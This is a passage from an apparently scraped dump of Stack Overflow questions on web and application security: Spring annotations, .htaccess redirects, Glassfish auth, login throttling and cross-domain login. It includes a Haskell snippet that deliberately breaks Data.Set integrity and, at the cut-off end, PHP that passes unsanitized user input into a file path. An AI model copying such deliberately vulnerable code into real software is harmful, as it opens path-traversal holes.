SHA1, but I'm unsure on how to tell.</p>\n"},{"tags":["spring","security","spring-mvc","spring-security"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":53,"score":0,"question_id":12745416,"title":"Spring Security annotations not consistent?","body":"<p>I noticed that on my code, I can successfully annotate methods on services classes (@Service) with both @Secured(\"ROLE_ADMIN\") and @RolesAllowed(\"ROLE_ADMIN\"). It works. Though, when I move the same annotations to the controller classes (@Controller) only @Secured gets activated whereas @RolesAllowed is ignored. I configured my root applicationContext with</p>\n\n<pre><code>&lt;security:global-method-security \n          jsr250-annotations=\"enabled\" \n          secured-annotations=\"enabled\"/&gt;\n</code></pre>\n\n<p>Why isn't @RollesAllowed applicable to controller classes while @Secured is?</p>\n"},{"tags":["security",".htaccess","ssl","https"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":12,"score":0,"question_id":12751326,"title":"How to specify Multiple Secure Webpages with .htaccess RewriteCond","body":"<p>I have 3 pages that I want to make secure on my website using .htaccess</p>\n\n<pre><code>-login.php\n-checkout.php\n-account.php\n</code></pre>\n\n<p>I know how to make just one work page at a time using .htaccess</p>\n\n<pre><code>RewriteEngine On\nRewriteCond %{HTTPS} off\nRewriteCond %{REQUEST_URI} /login.php\nRewriteRule (.*) https://%{HTTP_HOST}%{REQUEST_URI} [L]\n</code></pre>\n\n<p>I and trying to figure out how to include the other 2 specific pages to make them also secure and used the expression below but it didn't work</p>\n\n<pre><code>RewriteEngine On\nRewriteCond %{HTTPS} off\nRewriteCond %{REQUEST_URI} /login.php\nRewriteCond %{REQUEST_URI} /checkout.php\nRewriteCond %{REQUEST_URI} /account.php\nRewriteRule (.*) https://%{HTTP_HOST}%{REQUEST_URI} [L]\n</code></pre>\n\n<p>Can someone help me the right expression that will work with multiple pages?</p>\n\n<p>The second part of the code is that, if https is already on and a user move to a page that Is not any of the pages i specified about, I want that it should get back to http. how should I write the statement for it to redirect back to http if its not any of the pages above? </p>\n\n<p>I have my statement like this but its not working </p>\n\n<pre><code>RewriteCond %{HTTPS} on \nRewriteRule !(checkout|login|account|payment)\\.php http://%{HTTP_HOST}%{REQUEST_URI} [L,R]\n</code></pre>\n\n<p>Any thoughts? </p>\n"},{"tags":["security","validation"],"answer_count":4,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":116,"score":0,"question_id":4967855,"title":"Is a one letter username insecure?","body":"<p>We are building a secure application and were discussing the validation needed for a username.\nIt is clear that for a password that complexity rules must be established, yet for a username is it also true? \nIs it insecure to accept a one letter username? What are the security issues?</p>\n"},{"tags":["c#","security","ssl","asp.net-web-api","client-certificates"],"answer_count":2,"favorite_count":1,"up_vote_count":5,"down_vote_count":0,"view_count":144,"score":5,"question_id":12308434,"title":"ASP.NET WebApi - How do I \"allow\", but not \"require\" client certificates?","body":"<p>In IIS, I can \"ignore\", \"allow\" and \"require\" client certificates.</p>\n\n<p>In ASP.NET WebAPI (version 4.0 that just launched a little while back), I seem to have the ability to only \"ignore\" or \"require\".</p>\n\n<p>By default, client certificates are ignored... so this statement always yields null:</p>\n\n<pre><code>var cert = actionContext.Request.GetClientCertificate();\n</code></pre>\n\n<p>But, if I set this flag on my config:</p>\n\n<pre><code>config.ClientCredentialType = HttpClientCredentialType.Certificate;\n</code></pre>\n\n<p>Then I get the client cert... but, I no longer have the ability to allow anonymous access.</p>\n\n<p>My anonymous client now gets a <code>403</code> error: \"The remote server returned an error: (403) Forbidden.\"</p>\n\n<p>Can I do a sort of \"allow\" like in IIS?</p>\n"},{"tags":["android","security","android-apk"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":37,"score":0,"question_id":12750200,"title":"how can we find the urls where an android apk sends request?","body":"<p>I want to check whether an app is an spam app or not. So for that i need to find out the urls where it is sending requests. Any way to find out ?</p>\n\n<p>I had decompiled the app using apktool.</p>\n\n<p>thanks in advance.</p>\n"},{"tags":["java","linux","security","glassfish","basic-authentication"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":1783,"score":0,"question_id":5912577,"title":"How to implement basic authentication with Glassfish?","body":"<p>I'm tried this configuration but it didn't work for me. \n<a href=\"http://stackoverflow.com/questions/3892870/basic-authentication-in-glassfish\">Basic Authentication in Glassfish</a> \nI also tried this guide \n<a href=\"http://maksim.sorokin.dk/it/2010/10/13/basic-authentication-in-glassfish-3/\" rel=\"nofollow\">http://maksim.sorokin.dk/it/2010/10/13/basic-authentication-in-glassfish-3/</a> but I couldn't get user-pass asking with it too.</p>\n\n<p>These are steps I've taken:<br>\n1. Login as admin to Admin interface.<br>\n2. Go to Security->Realms->File<br>\n3. Add a group name (Users) to Assign Groups field.<br>\n4. Open manage users at the top of the page.<br>\n5. Click New and add an user (testuser) and give a password.<br>\n6. Add (Users) to Group List.<br>\n7. put this lines to web.xml</p>\n\n\n\n<pre class=\"lang-xml prettyprint-override\"><code>&lt;security-constraint&gt;\n    &lt;web-resource-collection&gt;\n        &lt;web-resource-name&gt;Secure Application&lt;/web-resource-name&gt;\n        &lt;url-pattern&gt;/*&lt;/url-pattern&gt;\n        &lt;http-method&gt;GET&lt;/http-method&gt;\n        &lt;http-method&gt;POST&lt;/http-method&gt;\n    &lt;/web-resource-collection&gt;\n\n    &lt;auth-constraint&gt;\n        &lt;role-name&gt;User&lt;/role-name&gt;\n    &lt;/auth-constraint&gt;\n  &lt;/security-constraint&gt;\n\n  &lt;login-config&gt;\n    &lt;auth-method&gt;BASIC&lt;/auth-method&gt;\n    &lt;realm-name&gt;file&lt;/realm-name&gt;\n  &lt;/login-config&gt;\n\n  &lt;security-role&gt;\n    &lt;role-name&gt;User&lt;/role-name&gt;\n  &lt;/security-role&gt;\n</code></pre>\n\n<p>8. and put this lines to sun-web.xml</p>\n\n<pre class=\"lang-xml prettyprint-override\"><code>&lt;sun-web-app error-url=\"\"&gt;\n  &lt;security-role-mapping&gt;\n    &lt;role-name&gt;User&lt;/role-name&gt;\n    &lt;group-name&gt;Users&lt;/group-name&gt;\n  &lt;/security-role-mapping&gt;\n&lt;/sun-web-app&gt;\n</code></pre>\n\n<p>9. After all I enabled Configurations->server-config->Security->Security Manager </p>\n\n<p>My configuration is Glassfish 3.1, sun java6 jdk, Debian lenny and a simple \"Hello World\" page for testing.</p>\n\n<p>What is missing here?</p>\n\n<p>UPDATE:</p>\n\n<p>I figured out it needs xml headers. After I've added them it started to work. My final configuration is below:</p>\n\n<pre class=\"lang-xml prettyprint-override\"><code>&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;\n&lt;web-app version=\"3.0\" xmlns=\"http://java.sun.com/xml/ns/javaee\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\"http://java.sun.com/xml/ns/javaee http://java.sun.com/xml/ns/javaee/web-app_3_0.xsd\"&gt;\n&lt;security-constraint&gt;\n    &lt;web-resource-collection&gt;\n        &lt;web-resource-name&gt;Secure Application&lt;/web-resource-name&gt;\n        &lt;url-pattern&gt;/*&lt;/url-pattern&gt;\n        &lt;http-method&gt;GET&lt;/http-method&gt;\n        &lt;http-method&gt;POST&lt;/http-method&gt;\n    &lt;/web-resource-collection&gt;\n\n    &lt;auth-constraint&gt;\n        &lt;role-name&gt;Users&lt;/role-name&gt;\n    &lt;/auth-constraint&gt;\n&lt;/security-constraint&gt;\n\n  &lt;login-config&gt;\n    &lt;auth-method&gt;BASIC&lt;/auth-method&gt;\n    &lt;realm-name&gt;file&lt;/realm-name&gt;\n  &lt;/login-config&gt;\n\n  &lt;security-role&gt;\n    &lt;role-name&gt;Users&lt;/role-name&gt;\n  &lt;/security-role&gt;\n&lt;/web-app&gt;\n</code></pre>\n\n<p>and </p>\n\n<pre class=\"lang-xml prettyprint-override\"><code>&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;\n&lt;!DOCTYPE sun-web-app PUBLIC \"-//Sun Microsystems, Inc.//DTD Application Server 9.0 Servlet 2.5//EN\" \"http://www.sun.com/software/appserver/dtds/sun-web-app_2_5-0.dtd\"&gt;\n&lt;sun-web-app error-url=\"\"&gt;\n  &lt;security-role-mapping&gt;\n    &lt;role-name&gt;Users&lt;/role-name&gt;\n    &lt;group-name&gt;Users&lt;/group-name&gt;\n  &lt;/security-role-mapping&gt;\n&lt;/sun-web-app&gt;\n</code></pre>\n"},{"tags":["php","security","api","ssl","payment-gateway"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":36,"score":0,"question_id":12732991,"title":"Transferring information securely across domains","body":"<p>HI guys have a bit of a logic question. I have a client that does event registration on sites A. B. and C. and they would like to start taking payments for the registrations. Now it would be a bit outlandish to create a payment platform on each site so I'm thinking of handling all the payments on an external source say, site D. now, what i'd need to do is create some sort of API that will receive payment data and handle it accordingly (I.E. process, reject, return messages etc.). My biggest concern is A. the security of this and B. really differentiating between clients (site A. B. and C.) and the possibility to vastly expand in the future. </p>\n\n<p>Is just transferring this data from an SSL secured site to another good enough? Should I be passing variables along with it? Thanks guys. </p>\n"},{"tags":["javascript","security","browser","cross-browser","xpcom"],"answer_count":2,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":2778,"score":3,"question_id":3658604,"title":"How to sign script or webpage requiring UniversalXPConnect privilege","body":"<p>I have a website which uses some functionality implemented in the Firefox extension, which I developed. JavaScript script on one of my webpages requires UniversalXPConnect privilege for communicating with XPCOM component implemented in my Firefox extension.</p>\n\n<p>By default, when my script tries to enable this privilege for accessing XPCOM component:</p>\n\n<p>netscape.security.PrivilegeManager.enablePrivilege(\"UniversalXPConnect\");</p>\n\n<p>... the following error occurs:</p>\n\n<p>Error: A script from \"http://example.com\" was denied UniversalXPConnect privileges.</p>\n\n<p>To enable this privilege currently users need to manually edit \"signed.applets.codebase_principal_support\" setting in \"about:config\" Firefox page.</p>\n\n<p>From this page: <a href=\"http://www.mozilla.org/projects/security/components/signed-scripts.html\" rel=\"nofollow\">http://www.mozilla.org/projects/security/components/signed-scripts.html</a> I learned that it is possible to explicitly sign my webpage containing script which requires this privilege. After I sign my script users will not need to manually edit above mentioned setting.</p>\n\n<p>Website is hosted on Linux platform under Drupal CMS.</p>\n\n<p>I would very much appreciate if you could give me detailed step-by-step instructions on how do I sign my script (what tools should I download, how to create certificate, etc.), such that after following your instructions editing about:config setting will not be necessary.</p>\n"},{"tags":["oracle","security","websphere","audit"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":51,"score":1,"question_id":12606026,"title":"Capturing End User detail in an Oracle DB via Connection Pool in Websphere","body":"<p>I am currently working on an auditing piece where I need to know the end user name in the Oracle database in the background.</p>\n\n<p>The application uses Oracle authentication to grant access, and to handle permissions on features in the application.  It also (correctly) handles access to underlyinig data, ensuring the end user credentials persist into the data layer.</p>\n\n<p>When I try to audit the application (using Oracle auditing) I only get the connection pool user ID and the Websphere server name.</p>\n\n<p>I have searched and found suggestions to use Reauthentication (which doesn't log the correct user ID until the connection pool is fully used), WAS.clientinfo (which plain ol' doesn't pass the end user credentials to the DB) and have found reference to Guardium (which does the job, but is hideously expensive.)</p>\n\n<p>How can I pass end user information to the data layer?  I don't mind if this comes down to a configuration change, or a 3rd party product; as long as it works we can assess it.</p>\n"},{"tags":["objective-c","ios","security"],"answer_count":1,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":65,"score":2,"question_id":12735989,"title":"Sending password to server","body":"<p>I am asking myself. What is the best way to send personal information from your iOS device to the server. </p>\n\n<p>At this moment I encrypt the password in the app ( sha1 salt password pepper ) then I send post data using from iOS to the server. </p>\n\n<p>What is the best way to protect the user and secure for any MITM attacks. Is my way secure enough?</p>\n\n<p><strong>UPDATE:</strong></p>\n\n<p>I added the SSL certificate. To make sure the user only has to login once I store a key generated when the user registered. I fetch them when the user logins for the first time. In oombination with the username and user id. Is this a good way? Only jailbroken users can read it and have risk.</p>\n"},{"tags":["c++","security","passwords","sql-server-ce"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":49,"score":1,"question_id":12734705,"title":"Password solution for local database, passed between client and server","body":"<p>I have been working on a project that uses an sqlce database that is sent between the client, that needs to work off line, and a server that stores information database, the database is password protected. </p>\n\n<p>The hard part is, we have a business requirement that the users don't have to update to the latest version before reporting the information in the sqlce database and may even be a few generations behind with the latest version of the client and a possible updated password that the server needs to access the reported information in the database.</p>\n\n<p>Our current solution is to have the same static password, in the source code, on the client and the server and keeping them the same for backward compatibility.</p>\n\n<p><strong>My question is about a secure way to sync the password between the client and the server and keeping backward compatibility for older databases or being able to get some parameter from the database to see what password should match.</strong></p>\n\n<p>We use sql ce 3.1 and C++ at moment. solutions to the same problem in other technologies (SQLight? C#? Java?) are welcome since I think the problem can be applied on other projects.</p>\n\n<p>I hope my problem is clear and that there is a lot of answers out there, if there is something I need to clarify just ask me!</p>\n"},{"tags":["c#","asp.net","security","com+","dll"],"answer_count":1,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":927,"score":2,"question_id":2361442,"title":"Programmatically add user role to COM+ component (C#)","body":"<p>I wish to know the way to add ASP.NET (\"Machine_Name\"\\IIS_IUSRS) to user role in COM+ component programmatically using C#. So whenever my COM+ component is being installed, ASP.NET user is created under Role.</p>\n"},{"tags":["security","haskell","type-safety","language-extension"],"answer_count":1,"favorite_count":0,"up_vote_count":7,"down_vote_count":0,"view_count":109,"score":7,"question_id":12735274,"title":"Breaking Data.Set integrity without GeneralizedNewtypeDeriving","body":"<p>The code below uses an unsafe <code>GeneralizedNewtypeDeriving</code> extension to break <code>Data.Set</code> by inserting different elements with different <code>Ord</code> instances:</p>\n\n<pre><code>{-# LANGUAGE GeneralizedNewtypeDeriving #-}\nimport Data.Set\nimport System.Random\n\nclass AlaInt i where\n  fromIntSet :: Set Integer -&gt; Set i\n  toIntSet :: Set i -&gt; Set Integer\ninstance AlaInt Integer where\n  fromIntSet = id\n  toIntSet = id\nnewtype I = I Integer deriving (Eq, Show, AlaInt)\ninstance Ord I where compare (I n1) (I n2) = compare n2 n1 -- sic!  \n\ninsert' :: Integer -&gt; Set Integer -&gt; Set Integer\ninsert' n s = toIntSet $ insert (I n) $ fromIntSet s\n\nrandomInput = take 5000 $ zip (randomRs (0,9) gen) (randoms gen) where\n    gen = mkStdGen 911\n\ncreateSet = Prelude.foldr f empty where\n    f (e,True) = insert e\n    f (e,False) = insert' e\n\nmain = print $ toAscList $ createSet randomInput\n</code></pre>\n\n<p>The code prints <code>[1,3,5,7,8,6,9,6,4,2,0,9]</code>. Note that the list is unordered and has <code>9</code> twice.</p>\n\n<p>Is it possible to perform this dictionary swapping attack using other extensions, e.g. <code>ConstraintKinds</code>? If yes, can <code>Data.Set</code> be redesigned to be resilient to such attacks?</p>\n"},{"tags":["security","passwords","enterprise"],"answer_count":12,"favorite_count":6,"up_vote_count":18,"down_vote_count":0,"view_count":12162,"score":18,"question_id":185262,"title":"How does your company do \"Enterprise\" Password Management?","body":"<p>We've talked about <b>personal</b> password management <a href=\"http://stackoverflow.com/questions/11362/what-is-your-favorite-password-storage-tool\">here</a> but how do you guys manage your passwords at a company wide level?</p>\n"},{"tags":["silverlight","security","webclient"],"answer_count":0,"favorite_count":2,"up_vote_count":3,"down_vote_count":0,"view_count":264,"score":3,"question_id":6627417,"title":"Security rules for subclassing transparent type with safe-critical constructor in Silverlight","body":"<p>In the Silverlight (v4.0) security model, <a href=\"http://blogs.msdn.com/b/shawnfa/archive/2007/05/11/silverlight-security-iii-inheritance.aspx\" rel=\"nofollow\">Shawn Farkas says</a> of deriving from types:</p>\n\n<blockquote>\n  <p>[...] we see that\n  application types may only derive from\n  other application types or transparent\n  platform types. (*)</p>\n</blockquote>\n\n<p>The * part of this is:</p>\n\n<blockquote>\n  <p>(*) This true in 99.9% case.  There is another rule about the visibility of the default constructor of a class (which we'll get into next week when we dig deeper into the security model), which also requires that the base class' default constructor (if it has one), must be transparent as well.  Practically speaking, you're not generally going to find interesting transparent types in the platform which do not also have transparent default constructors, so this rule doesn't normally come into play.</p>\n</blockquote>\n\n<p>There is, however, one such interesting transparent type which does not have a transparent default constructor - the WebClient class. There's also a good reason to want to subclass it - to override GetWebRequest to provide support for cookies.</p>\n\n<p>As a test, I've tried the following both with and without the constructor attribute...</p>\n\n<pre><code>public class MyWebClient : WebClient\n{\n    [SecuritySafeCritical] // matches the attribute on the base class ctor\n    public MyWebClient() { }\n}\n</code></pre>\n\n<p>...but get the following error either way:</p>\n\n<blockquote>\n  <p>Inheritance security rules violated while overriding member: 'MyWebClient..ctor()'. Security accessibility of the overriding method must match the security accessibility of the method being overriden.</p>\n</blockquote>\n\n<p>It looks to me like this is the 0.1% case that he mentions. Unfortunately, as far as I can tell, the next posts never did expand on what the rule would be here. Thus I have two questions:</p>\n\n<ol>\n<li>Does anybody know what this 0.1% rule is?</li>\n<li>Given 1, is it possible to derive from WebClient in Silverlight 4?</li>\n</ol>\n"},{"tags":["security","authentication","iis","internet"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":58,"score":0,"question_id":12741040,"title":"IIS 7 secure windows authentication over the internet","body":"<p>I would like to deploy my great new ASP.Net app to my internet facing web server. I would like to use windows authenticaion over the internet, so that I.E. automatically prompts for windows login credentials. I want to make sure it is adequately secure.</p>\n\n<p>Some parameters around this are:</p>\n\n<ul>\n<li>I do not wish to implement SSL at this stage.</li>\n<li>We only have one server to authenticate to.\nI've read a lot about man in the middle attacks redirecting authentication information to a third party server, but in my case there is only one server - the one they are logging on to.</li>\n<li>I've been reading about IIS Windows Authentication Extended Protection, but I'm still uncertain of it's benefits</li>\n</ul>\n\n<p>So basically if I enable IIS Windows Authentication Extended Protection, and I can be certain no one gets phished, can I be pretty certain that this is going to be secure?</p>\n\n<p>Our server regularly suffers attacks - I think a few mistakes in the early days have got it on to an 'easy target' list.</p>\n"},{"tags":["wordpress","apache","security"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":3,"view_count":11,"score":-3,"question_id":12741249,"title":"How to Correct Server Access Control","body":"<p>I could anyone here please explain to me how to create new user roles with this tut. </p>\n\n<p><a href=\"http://blog.sucuri.net/2012/07/wordpress-and-server-hardening-taking-security-to-another-level.html\" rel=\"nofollow\">http://blog.sucuri.net/2012/07/wordpress-and-server-hardening-taking-security-to-another-level.html</a> </p>\n\n<p>I'm just starting to learn how to use my first DS. Thanks.</p>\n"},{"tags":["security","cookies","jboss","seam","jsessionid"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":100,"score":0,"question_id":12740893,"title":"Jboss Seam JSESSIONID Cookie-Settings","body":"<p>I wanted to know, how I can override the jsessionid-cookie setting such as httpoly, secure and so on.\nI didn't find any setting or other easy possibility to set these things.\nCould it be something in the <code>web.xml</code> under session-config or can I add the settings via an servlet filter? </p>\n\n<p>What would you suggest.</p>\n"},{"tags":["security","ssl","certificate","openssl"],"answer_count":2,"favorite_count":1,"up_vote_count":4,"down_vote_count":0,"view_count":103,"score":4,"question_id":6156227,"title":"Does the certificate a SSL connection/state \"points\" to change if I load a new certificate in OpenSSL?","body":"<p>I am building an application that will enable users to connect to the same server. Rather than the application/device using its own certificate/private key, it is important to ensure that each user has their own certificate/private key to use for encryption. </p>\n\n<p>Now I know, from the OpenSSL website documents, that their internal certificate store of OpenSSL can hold one certificate/key pair for the RSA cipher. My question is this:</p>\n\n<p>Presume I have a SSL struct named <strong>ssl1</strong> that I created from my SSL_CTX where I didn't set the certificate/key to use in the SSL_CTX (thus not inheriting the certificate/key). I then go on to set the certificate/key for <strong>ssl1</strong> that is associated with some user. Then suppose I have another SSL struct named <strong>ssl2</strong> created from the same SSL_CTX. I then go on to set the certificate/key for <strong>ssl2</strong> that is associated with a different user than the first one. </p>\n\n<p>If at this point I call the SSL_connect() API on <strong>ssl1</strong> will it use the certificate/key I set for <strong>ssl2</strong>? I ask since the store says it only holds one cert/key pair and I loaded the cert/key for <strong>ssl2</strong> last, thus I presume it would overwrite the one I loaded first for <strong>ssl1</strong>.</p>\n\n<p>Thanks for reading my post. I appreciate any help/wisdom/pointers you can provide.</p>\n"},{"tags":["php","security","ip-address","session-variables"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":2,"view_count":34,"score":-1,"question_id":12740625,"title":"Grabbing an IP Address without needing to turn on Register Globals","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/1437771/how-can-i-get-the-clients-ip-address-in-a-php-webservice\">How can I get the client&#39;s IP address in a PHP webservice?</a>  </p>\n</blockquote>\n\n\n\n<p>I'm wanting to grab the IP Address from the user but I don't want to turn register globals on in my php.ini file. Is there a way to work around this and still grab the ip address?</p>\n"},{"tags":["android","security","application","key","code-signing"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":24,"score":0,"question_id":12733726,"title":"Implications of 2 entities sharing an android signing key","body":"<p>I'm thinking about buying an existing android app from another developer. He has signed other apps not included in the sale with the same signing key as those included in the sale. What if any are the implications of sharing or duplicating the key and us both having a copy so we can update our owned apps? My main concern is can he update my newly purchased app without my permission or access to my developer account or vice versa?</p>\n"},{"tags":["security","login","sso","dns"],"answer_count":5,"favorite_count":29,"up_vote_count":16,"down_vote_count":0,"view_count":7082,"score":16,"question_id":342378,"title":"Cross Domain Login - How to login a user automatically when transferred from one domain to another","body":"<p>We offer a number of online services. We are required to develop a system which provides a quick/simple experience for users if they are transferred from one service (on <code>domain1.com</code>) to another service (on <code>domain2.com</code>).</p>\n\n<p>Is there a safe and secure way to automatically login a user automatically once he has been transferred to the new service?</p>\n\n<p>Yell at me if the solution below is completely insecure/wrong.</p>\n\n<p>We were considering a system similar to that provided by a number of online services for password recovery - they are emailed a link with a unique hash which expires, that allows them to change their password.</p>\n\n<p>The <code>domain1.com</code> would generate a unique hash and store it in a database with the hash linked to a user along with an expire datetime field.</p>\n\n<p>The user will be transferred to <code>domain2.com/auto/?hash=d41d8cd98f00b204e9800998ecf8427e</code></p>\n\n<p><code>domain2.com</code> would next make a request to <code>domain1.com</code> with the hash to get the information about the user. <code>domain1.com</code> would then remove the hash from the database. <code>domain2.com</code> would log the user in and set cookie etc.</p>\n\n<p>Could something based on OpenID or OAuth achieve the same results?</p>\n\n\n"},{"tags":["php","security","web-security","throttling","honeypot"],"answer_count":11,"favorite_count":23,"up_vote_count":20,"down_vote_count":0,"view_count":5977,"score":20,"question_id":2090910,"title":"How can I throttle user login attempts in PHP","body":"<p>I was just reading this post <a href=\"http://stackoverflow.com/questions/549/the-definitive-guide-to-website-authentication-beta#477585\">http://stackoverflow.com/questions/549/the-definitive-guide-to-website-authentication-beta#477585</a> on Preventing Rapid-Fire Login Attempts.  </p>\n\n<p>Best practice #1: A short time delay that increases with the number of failed attempts,   like:  </p>\n\n<p>1 failed attempt = no delay<br>\n2 failed attempts = 2 sec delay<br>\n3 failed attempts = 4 sec delay<br>\n4 failed attempts = 8 sec delay<br>\n5 failed attempts = 16 sec delay<br>\netc.  </p>\n\n<p>DoS attacking this scheme would be very impractical, but on the other hand, potentially devastating, since the delay increases exponentially.  </p>\n\n<p><strong>I am curious how I could implement something like this for my login system in PHP?</strong>  </p>\n"},{"tags":[".net","wcf","security","logging","serialization"],"answer_count":1,"favorite_count":2,"up_vote_count":3,"down_vote_count":0,"view_count":55,"score":3,"question_id":12547687,"title":"Personally Identifiable Information (PII), Traces, and MessageLogging","body":"<p><a href=\"http://msdn.microsoft.com/en-us/library/ms730318%28v=vs.100%29.aspx\" rel=\"nofollow\">MSDN talks about how credit card information could accidentally be logged during traces</a>.  But that same article explains that \"known\" Personally Identifiable Information is not logged.  </p>\n\n<p>What I'd like to know is if there is a way to 'flag' members of a DataContract as PII, to take advantage of the .net built-on capability of filtering out PII from traces and logs?  I'm thinking the answer is \"no,\" because the user names and passwords the article references I suspect are part of authentication steps, rather than part of data contracts that follow authentication.</p>\n\n<p>Even so, is there any kind of built-in .net attribute I can annotate a Data Contract or serializeable class members with, which means \"hey, this is a security sensitive attribute, beware!\"</p>\n"},{"tags":["security","url","hacking"],"answer_count":7,"favorite_count":2,"up_vote_count":14,"down_vote_count":0,"view_count":748,"score":14,"question_id":4833314,"title":"Are secret URLs truly secure?","body":"<p>I never leave backdoors in my system, but out of curiosity I was wondering if I left a secret URL like /x52d23r that allowed to bypass some sort of security, and this was only for my personal use---would that be somehow discovered by a third party without getting the information from me?</p>\n\n<p>For example, secret ports can be port scanned and fingerprinted, but can the same sort of tactic be done for secret URLs?</p>\n"},{"tags":["security","symfony2"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":31,"score":0,"question_id":12331757,"title":"How to get from symfony 2 the security.firewalls.secured_area?","body":"<p>how can i get from symfony 2 (security) this data's?</p>\n\n<pre><code>secured_area:\n        pattern: /.*\n        form_login:\n            check_path: /logstart\n            login_path: /login\n        logout: \n            path:   /logout\n            target: /login\n        remember_me:\n            key:      aSecretKey\n            lifetime: 3600\n            path:     /\n            domain:   ~\n</code></pre>\n"},{"tags":["ruby-on-rails","security","heroku","github"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":51,"score":0,"question_id":12734495,"title":"Deploying with Heroku using a database.yaml file not in github repo","body":"<p>When pushing to Github, I want to .gitignore my database.yaml file so that I don't publically expose my production database password.  But I need that password to be available to Heroku for when the app is running in production.</p>\n\n<p>I could set environment variables in heroku, but that strikes me as unsecure.  Any able to get on my computer could run a single command in terminal and reveal the password variable.</p>\n\n<p>When dealing with Github and Heroku, it is possible to write code that specifies that certain files should be ignored when pushing to github but not ignored when pushing to heroku?</p>\n"},{"tags":["php","security","session","authentication","login"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":2,"view_count":80,"score":-1,"question_id":12733503,"title":"Very simple authentication system in PHP?","body":"<p>I need to write a very simple login/authentication system in PHP so that I can protect some PHP files from unauthorized access. I don't need to allow new users to \"register\" or anything fancy like that; all I need to do is to assign a few people usernames and allow them to choose a password. I was thinking of the following:</p>\n\n<ol>\n<li>Assign the person a username.</li>\n<li>Have them go to a website that has a password hashing tool, like <a href=\"http://www.xorbin.com/tools/sha1-hash-calculator\" rel=\"nofollow\">this site</a>, and have them send me the hash which I would then put in the DB (this way I don't know what their password is).</li>\n<li>In my PHP files, use a <code>session</code> variable to check if the user is logged in or not, and if not then direct them to a login page.</li>\n<li>If they weren't logged in, then they fill out their username and password and if it's correct then I start a <code>session</code> for them.</li>\n<li>The user now has access to the php pages.</li>\n</ol>\n\n<p>Does that sound like a good plan? Would this authentication system be secure?</p>\n\n<p>Thanks for your advice.</p>\n"},{"tags":["security","publickey"],"answer_count":2,"favorite_count":1,"up_vote_count":19,"down_vote_count":0,"view_count":9666,"score":19,"question_id":2292495,"title":"What is the difference between a cer, pvk, and pfx file?","body":"<p>What is the difference between a cer, pvk, and pfx file?</p>\n\n<p>EDIT:</p>\n\n<p>Also, which files do I keep and which am I expected to give to my counter-parties?</p>\n"},{"tags":["security","report","system","virus","trust"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":14,"score":0,"question_id":12728648,"title":"Virus that looks through a system and reports all it finds","body":"<p>I am doing a report on Information Security.</p>\n\n<p>Is there any such virus that 'acts' as input data to a software system, and then as it goes through different applications and systems, reports back to a third party about what's happening to it or what it can 'see' in the system?</p>\n\n<p>Just wondering because this will be very useful for my report.</p>\n\n<p>Thanks!</p>\n"},{"tags":["php","html","security","authorization","protection"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":24,"score":0,"question_id":12731900,"title":"Protect Files from unauthorized access","body":"<p>I have this very big problem I've been trying to solve for last few days with no success. I have some files which are class schedules, these are imported to the server from an external source (html format). I need to block direct access to those files. They are displayed by PHP script. So, these are assumptions:\n-files displayed via php script\n-files cannot be modified in any way (html files)\n-there must be no direct access to those files\n-server is apache</p>\n\n<p>any ideas? I tried with htaccess, but I may be not competent enough, because it was blocking access to files for php script too.</p>\n\n<p>Thanks in advance.</p>\n"},{"tags":["c#","asp.net","wcf","security"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":446,"score":2,"question_id":9614857,"title":"Error with PrincipalPermission authentication in WCF","body":"<p>I am following a <a href=\"http://www.pluralsight-training.net/microsoft/courses/TableOfContents?courseName=wcf-design-concepts&amp;highlight=aaron-skonnard_serialization%2a1\" rel=\"nofollow\">Pluralsight video on Authentication</a>.</p>\n\n<p>I am trying to add simple PrinciplePermission authentication to my web service:</p>\n\n<pre><code>    [PrincipalPermission(SecurityAction.Demand, Role = \"Computer\\\\Group\")]\n    public String testDBConnection()\n    {\n        return \"success\";  \n    }\n</code></pre>\n\n<p>In my WCF client I am sending:</p>\n\n<pre><code>    client.ClientCredentials.UserName.UserName = \"Alice\";\n    client.ClientCredentials.UserName.Password = \"alice\";\n</code></pre>\n\n<p>I have created the group and added Alice to it as per the video, but now....</p>\n\n<p>I keep getting the error:</p>\n\n<p><strong>\"Request for principal permission failed.\"</strong></p>\n\n<p>Any idea what's wrong?</p>\n"},{"tags":["php","security","injection"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":51,"score":2,"question_id":12731547,"title":"Can an appended file suffix to a parameter for file_get_contents be bypassed?","body":"<p>Consider the following code</p>\n\n<pre><code>&lt;?php\n// warning: this code is unsafe and for demonstrational purposes only,\n// do not use in a production environment\n$filename = $_GET['filename']; \n$extension = 'txt';\n$path = '/absolute/path';\n$fullFilename = sprintf('%s/%s.%s', $path, $filename, 